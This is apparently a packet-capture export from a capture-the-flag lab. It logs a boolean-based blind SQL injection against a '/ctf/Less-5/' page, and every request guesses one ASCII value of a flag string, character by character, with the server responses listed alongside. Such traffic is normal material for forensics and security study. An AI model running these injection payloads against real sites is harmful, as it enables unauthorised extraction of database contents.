"No.","Time","Source","Destination","Protocol","Length","Info"
"12179","5.961668584","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12188","5.963992224","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=76--+ HTTP/1.1 "
"12191","5.966258466","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12200","5.968849040","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=77--+ HTTP/1.1 "
"12203","5.971178278","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12212","5.973558827","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=78--+ HTTP/1.1 "
"12215","5.975756874","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12224","5.977454019","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=79--+ HTTP/1.1 "
"12227","5.979626111","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12236","5.981926243","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=80--+ HTTP/1.1 "
"12239","5.984303128","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12248","5.987001423","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=81--+ HTTP/1.1 "
"12251","5.989245395","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12260","5.991643573","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=82--+ HTTP/1.1 "
"12263","5.993884021","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12272","5.996272298","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=83--+ HTTP/1.1 "
"12275","5.998525121","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12284","6.001087924","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=84--+ HTTP/1.1 "
"12287","6.003160217","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12296","6.005500051","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=85--+ HTTP/1.1 "
"12299","6.007748802","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12308","6.010355982","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=86--+ HTTP/1.1 "
"12311","6.012607729","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12320","6.014076394","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=87--+ HTTP/1.1 "
"12323","6.016097131","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12332","6.018597955","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=88--+ HTTP/1.1 "
"12335","6.020860626","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12344","6.024003150","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=89--+ HTTP/1.1 "
"12347","6.025782695","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12356","6.028414045","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=90--+ HTTP/1.1 "
"12359","6.030654292","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12368","6.032735937","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=91--+ HTTP/1.1 "
"12371","6.035017352","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12380","6.037637663","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=92--+ HTTP/1.1 "
"12383","6.039831794","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12392","6.042427099","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=93--+ HTTP/1.1 "
"12395","6.044710084","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12404","6.047079803","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=94--+ HTTP/1.1 "
"12407","6.049109871","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12416","6.051341240","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=95--+ HTTP/1.1 "
"12419","6.053414397","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12428","6.055678335","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=96--+ HTTP/1.1 "
"12431","6.057825949","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12440","6.060127778","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=97--+ HTTP/1.1 "
"12443","6.062228292","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12452","6.064468673","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=98--+ HTTP/1.1 "
"12455","6.066657356","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12464","6.069241610","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=99--+ HTTP/1.1 "
"12467","6.071520119","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12476","6.073989797","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=100--+ HTTP/1.1 "
"12479","6.076053234","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12488","6.078434091","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),16,1))=101--+ HTTP/1.1 "
"12491","6.080489834","192.168.246.1","192.168.246.23","HTTP","978","HTTP/1.1 200 OK  (text/html)"
"12500","6.083074820","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=33--+ HTTP/1.1 "
"12503","6.085356105","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12512","6.087769229","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=34--+ HTTP/1.1 "
"12515","6.089996241","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12524","6.092392313","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=35--+ HTTP/1.1 "
"12527","6.094693381","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12536","6.097175930","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=36--+ HTTP/1.1 "
"12539","6.099426796","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12548","6.102010299","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=37--+ HTTP/1.1 "
"12551","6.104302447","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12560","6.106794020","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=38--+ HTTP/1.1 "
"12563","6.108953122","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12572","6.112015317","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=39--+ HTTP/1.1 "
"12575","6.114241555","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12584","6.116448124","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=40--+ HTTP/1.1 "
"12587","6.118792740","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12596","6.121211404","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=41--+ HTTP/1.1 "
"12599","6.123243034","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12608","6.125881347","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=42--+ HTTP/1.1 "
"12611","6.128327659","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12620","6.130673193","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=43--+ HTTP/1.1 "
"12623","6.132997318","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12632","6.135613288","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=44--+ HTTP/1.1 "
"12635","6.137881882","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12644","6.140514512","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=45--+ HTTP/1.1 "
"12647","6.142641165","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12656","6.145053872","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=46--+ HTTP/1.1 "
"12659","6.147261414","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12668","6.150829924","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=47--+ HTTP/1.1 "
"12671","6.153071199","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12680","6.155674550","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=48--+ HTTP/1.1 "
"12683","6.158045626","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12692","6.160228060","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=49--+ HTTP/1.1 "
"12695","6.162457936","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12704","6.164618041","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=50--+ HTTP/1.1 "
"12707","6.166890561","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12716","6.169195958","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=51--+ HTTP/1.1 "
"12719","6.171469738","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12728","6.174085325","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=52--+ HTTP/1.1 "
"12731","6.176368132","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12740","6.178121543","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=53--+ HTTP/1.1 "
"12743","6.180332851","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12752","6.182798156","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=54--+ HTTP/1.1 "
"12755","6.184887620","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12764","6.187207776","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=55--+ HTTP/1.1 "
"12767","6.189262824","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12776","6.191674783","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=56--+ HTTP/1.1 "
"12779","6.193911812","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12788","6.196210814","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=57--+ HTTP/1.1 "
"12791","6.198235667","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12800","6.200871128","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=58--+ HTTP/1.1 "
"12803","6.205409481","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12812","6.207585606","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=59--+ HTTP/1.1 "
"12815","6.209806870","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12824","6.212470442","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=60--+ HTTP/1.1 "
"12827","6.214582622","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12836","6.216785221","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=61--+ HTTP/1.1 "
"12839","6.219024451","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12848","6.221666105","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=62--+ HTTP/1.1 "
"12851","6.224033961","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12860","6.226359211","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=63--+ HTTP/1.1 "
"12863","6.228760209","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12872","6.231141127","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=64--+ HTTP/1.1 "
"12875","6.233442189","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12884","6.236005490","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=65--+ HTTP/1.1 "
"12887","6.238421532","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12896","6.241074112","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=66--+ HTTP/1.1 "
"12899","6.243296196","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12908","6.245897309","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=67--+ HTTP/1.1 "
"12911","6.247923264","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12920","6.250475293","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=68--+ HTTP/1.1 "
"12923","6.253043341","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12932","6.255690938","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=69--+ HTTP/1.1 "
"12935","6.257954752","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12944","6.260079349","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=70--+ HTTP/1.1 "
"12947","6.262173335","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12956","6.264533740","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=71--+ HTTP/1.1 "
"12959","6.266812404","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12968","6.269277956","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=72--+ HTTP/1.1 "
"12971","6.271329627","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12980","6.273926736","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=73--+ HTTP/1.1 "
"12983","6.276339721","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"12992","6.278845431","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=74--+ HTTP/1.1 "
"12995","6.281383591","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13004","6.283999578","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=75--+ HTTP/1.1 "
"13007","6.286193958","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13016","6.288925500","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=76--+ HTTP/1.1 "
"13019","6.291129092","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13028","6.293815583","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=77--+ HTTP/1.1 "
"13031","6.295907392","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13040","6.298511052","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=78--+ HTTP/1.1 "
"13043","6.300821049","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13052","6.303581504","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=79--+ HTTP/1.1 "
"13055","6.306029399","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13064","6.308693190","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=80--+ HTTP/1.1 "
"13067","6.310813761","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13076","6.313429792","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=81--+ HTTP/1.1 "
"13079","6.315725885","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13088","6.318331157","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=82--+ HTTP/1.1 "
"13091","6.320729014","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13100","6.323330415","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=83--+ HTTP/1.1 "
"13103","6.325589445","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13112","6.328207999","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=84--+ HTTP/1.1 "
"13115","6.330483156","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13124","6.333121234","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=85--+ HTTP/1.1 "
"13127","6.335192142","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13136","6.337501559","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=86--+ HTTP/1.1 "
"13139","6.339758650","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13148","6.342363001","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=87--+ HTTP/1.1 "
"13151","6.344614990","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13160","6.346861484","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=88--+ HTTP/1.1 "
"13163","6.349331790","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13172","6.352006067","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=89--+ HTTP/1.1 "
"13175","6.354047348","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13184","6.356376286","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=90--+ HTTP/1.1 "
"13187","6.358457216","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13196","6.360736179","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=91--+ HTTP/1.1 "
"13199","6.364193560","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13208","6.366791897","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=92--+ HTTP/1.1 "
"13211","6.369057669","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13220","6.372201555","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=93--+ HTTP/1.1 "
"13223","6.374408987","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13232","6.376652644","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=94--+ HTTP/1.1 "
"13235","6.378764855","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13244","6.381317296","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=95--+ HTTP/1.1 "
"13247","6.383597236","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13256","6.386182216","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=96--+ HTTP/1.1 "
"13259","6.388462497","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13268","6.391085221","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=97--+ HTTP/1.1 "
"13271","6.393230519","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13280","6.395581537","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=98--+ HTTP/1.1 "
"13283","6.397879313","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13292","6.400422533","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=99--+ HTTP/1.1 "
"13295","6.402764237","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"13304","6.405399516","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),17,1))=100--+ HTTP/1.1 "
"13307","6.407660868","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
